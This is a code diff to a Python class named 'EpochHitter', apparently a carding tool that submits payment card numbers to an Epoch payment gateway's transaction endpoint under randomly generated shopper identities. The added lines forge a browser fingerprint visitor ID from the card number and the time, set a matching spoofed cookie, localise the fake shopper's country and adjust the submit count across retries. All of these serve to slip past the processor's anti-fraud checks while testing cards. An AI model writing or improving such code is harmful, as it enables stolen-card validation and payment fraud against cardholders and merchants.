@@ -151,6 +151,7 @@ class EpochHitter:
                     cfg['token'] = state_data.get('token')
                     cfg['cacheKey'] = state_data.get('queryParams', {}).get('cacheKey') or state_data.get('invoiceQuery', {}).get('cacheKey') or cfg['cacheKey']
                     cfg['sessionID'] = state_data.get('sessionID') or state_data.get('queryParams', {}).get('sessionID') or cfg['sessionID']
+                    cfg['countryCode'] = state_data.get('locale', {}).get('countryCode') or 'US'
                     cfg['is_epoch'] = True
                 except Exception:
                     pass
@@ -350,7 +351,7 @@ class EpochHitter:
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
 
-                shopper = _generate_random_shopper()
+                shopper = _generate_random_shopper(cfg.get('countryCode', 'US'))
                 yr = card['year'] if len(card['year']) == 4 else f"20{card['year']}"
                 yr_short = yr[-2:]
 
@@ -358,6 +359,7 @@ class EpochHitter:
                 if cfg.get('token') and (cfg.get('cacheKey') or 'wnu.com' in self.url.lower()):
                     c_key = cfg.get('cacheKey') or parse_qs(urlparse(self.url).query).get('cacheKey', [''])[0]
                     s_id = cfg.get('sessionID') or parse_qs(urlparse(self.url).query).get('sessionID', [''])[0]
+                    visitor_id = hashlib.md5(f"{card['card']}_{time.time()}".encode()).hexdigest()
                     
                     tx_payload = {
                         "cacheKey": c_key,
@@ -369,7 +371,8 @@ class EpochHitter:
                         "productCode": cfg.get('productCode', '1'),
                         "currencyCode": cfg.get('currency', 'USD'),
                         "countryCode": shopper.get('country', 'US'),
-                        "submitCount": 1,
+                        "fingerprintVisitorId": visitor_id,
+                        "submitCount": max(1, attempt),
                         "paymentType": "CreditDebitCard",
                         "redirectType": "CreditDebitCard",
                         "fullName": shopper['full_name'],
@@ -405,6 +408,7 @@ class EpochHitter:
                         "User-Agent": UA,
                         "Origin": self._get_origin(),
                         "Referer": self.url,
+                        "Cookie": f"ephfpd={visitor_id}",
                     }
                     
                     tx_url = urljoin(self.url, "/transaction")
